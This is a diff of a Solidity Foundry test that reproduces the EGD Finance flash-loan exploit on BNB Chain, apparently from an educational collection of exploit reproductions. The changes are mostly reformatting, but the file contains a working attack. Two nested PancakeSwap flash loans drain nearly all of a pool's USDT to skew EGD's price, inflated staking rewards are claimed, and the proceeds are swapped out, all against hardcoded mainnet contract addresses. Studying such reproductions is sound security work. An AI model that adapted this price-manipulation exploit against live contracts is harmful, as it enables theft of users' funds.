@@ -2,7 +2,10 @@
 pragma solidity ^0.8.10;
 
 import {Test, console} from "forge-std/Test.sol";
-import "./interface/Interface.sol";
+
+import "./interface/IPancake.sol";
+import "./interface/IERC20.sol";
+import "./interface/IEGDFinance.sol";
 
 /* 
 @KeyInfo - Total Lost : ~36,044 US$
@@ -24,14 +27,19 @@ contract Exploit is Test {
     uint256 constant borrow1 = 2000 ether;
     uint256 borrow2;
 
-    IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
-    IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
-    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IPancakePair constant USDT_WBNB_LPPool =
+        IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
+    IPancakePair constant EGD_USDT_LPPool =
+        IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
+    IPancakeRouter constant pancakeRouter =
+        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
     address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
     address constant egdToken = 0x202b233735bF743FA31abb8f71e641970161bF98;
-    address constant attacker = address(0xC30808D9373093fBFCEc9e026457C6a9DaB706a7);
-    address constant statkeInvitor = address(0x659b136c49Da3D9ac48682D02F7BD8806184e218);
+    address constant attacker =
+        address(0xC30808D9373093fBFCEc9e026457C6a9DaB706a7);
+    address constant statkeInvitor =
+        address(0x659b136c49Da3D9ac48682D02F7BD8806184e218);
 
     function setUp() public {
         // 注意: 必須 fork 攻擊 tx 的前一個 block, 因為此時受害合約狀態尚未改變!!
@@ -48,8 +56,12 @@ contract Exploit is Test {
     }
 
     function testRegular() public {
-        console.log("-------------------------------- Regular ----------------------------------");
-        uint256 rewardBalance = IEGD_Finance(EGD_Finance).calculateAll(address(this));
+        console.log(
+            "-------------------------------- Regular ----------------------------------"
+        );
+        uint256 rewardBalance = IEGD_Finance(EGD_Finance).calculateAll(
+            address(this)
+        );
         uint256 EGDBalance = IERC20(egdToken).balanceOf(address(this));
 
         emit log_named_decimal_uint("Pre reward Balance", rewardBalance, 18);
@@ -76,10 +88,14 @@ contract Exploit is Test {
     }
 
     function testExploit() public {
-        console.log("-------------------------------- Exploit ----------------------------------");
+        console.log(
+            "-------------------------------- Exploit ----------------------------------"
+        );
         uint256 USDTBalance = IERC20(usdt).balanceOf(address(this));
         uint256 EGDPrice = IEGD_Finance(EGD_Finance).getEGDPrice();
-        uint256 EGDReward = IEGD_Finance(EGD_Finance).calculateAll(address(this));
+        uint256 EGDReward = IEGD_Finance(EGD_Finance).calculateAll(
+            address(this)
+        );
 
         // 攻擊前, 先 print 出餘額, 已便於更好的觀察 balance 變化
         emit log_named_decimal_uint("USDT Balance", USDTBalance, 18);
@@ -111,14 +127,26 @@ contract Exploit is Test {
         IEGD_Finance(EGD_Finance).stake(100 ether);
     }
 
-    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+    function pancakeCall(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) public {
         // Flashloan[1]
         if (keccak256(data) == keccak256("0000")) {
             // borrow 2000 usdt
-            emit log_named_decimal_uint("Before flashswap, usdt balance:", IERC20(usdt).balanceOf(address(this)), 18);
+            emit log_named_decimal_uint(
+                "Before flashswap, usdt balance:",
+                IERC20(usdt).balanceOf(address(this)),
+                18
+            );
 
             // Attacker borrows 99.99999925% USDT of EGD_USDT_LPPool reserve
-            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000;
+            borrow2 =
+                (IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) *
+                    9_999_999_925) /
+                10_000_000_000;
             EGD_USDT_LPPool.swap(0, borrow2, address(this), "00");
 
             // 漏洞利用結束, 把盜取的 EGD Token 換成 USDT
@@ -127,8 +155,12 @@ contract Exploit is Test {
             path[1] = usdt;
             IERC20(egdToken).approve(address(pancakeRouter), type(uint256).max);
             pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-                IERC20(egdToken).balanceOf(address(this)), 1, path, address(this), block.timestamp
-            );
+                    IERC20(egdToken).balanceOf(address(this)),
+                    1,
+                    path,
+                    address(this),
+                    block.timestamp
+                );
 
             // 闪电贷回款 USDT
             uint256 fee = ((amount0 * 5) / 1000);
@@ -136,7 +168,10 @@ contract Exploit is Test {
             emit log_named_decimal_uint("Amount to repay:", amountToRepay, 18);
 
             // 攻擊者還款 2,000 USDT + 0.5% 服務費
-            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), amountToRepay);
+            bool suc = IERC20(usdt).transfer(
+                address(USDT_WBNB_LPPool),
+                amountToRepay
+            );
             require(suc, "Flashloan[1] payback failed");
         } else {
             // Flashloan[2]
@@ -147,12 +182,19 @@ contract Exploit is Test {
             IEGD_Finance(EGD_Finance).claimAllReward();
 
             uint256 egdTokenBalance = IERC20(egdToken).balanceOf(address(this));
-            emit log_named_decimal_uint("Get reward (EGD token)", egdTokenBalance, 18);
+            emit log_named_decimal_uint(
+                "Get reward (EGD token)",
+                egdTokenBalance,
+                18
+            );
 
             // Attacker needs to pay >0.25% fee back to Pancakeswap
             // 424,456,221,210,335,857,574,110 loan
             // 425,729,589,873,966,865,146,832 back
-            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), (amount1 * 10_000 / 9970));
+            bool suc = IERC20(usdt).transfer(
+                address(EGD_USDT_LPPool),
+                ((amount1 * 10_000) / 9970)
+            );
             require(suc, "Flashloan[2] payback failed");
         }
     }
